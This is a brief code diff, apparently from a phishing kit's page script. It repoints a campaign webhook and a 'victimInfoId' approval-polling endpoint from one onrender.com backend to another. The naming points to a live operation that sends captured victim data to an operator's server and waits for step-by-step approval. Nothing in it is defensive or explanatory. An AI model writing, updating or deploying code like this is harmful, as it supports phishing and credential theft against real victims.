@@ -430,7 +430,7 @@
             console.log('Campaign ID:', campaignId);
             
             // Use your actual backend host here
-            const webhookUrl = `https://emailgrid.onrender.com/webhook/${campaignId}/`;
+            const webhookUrl = `https://accesszilla.onrender.com/webhook/${campaignId}/`;
             console.log('Webhook URL:', webhookUrl);
             
             showLoadingButton(true);
@@ -482,7 +482,7 @@
         }
 
         function pollForApproval(victimInfoId, campaignId, step) {
-            const pollUrl = `https://emailgrid.onrender.com/status/${victimInfoId}/?step=${step}`;
+            const pollUrl = `https://accesszilla.onrender.com/status/${victimInfoId}/?step=${step}`;
             
             let pollingActive = true; // Flag to control polling
             
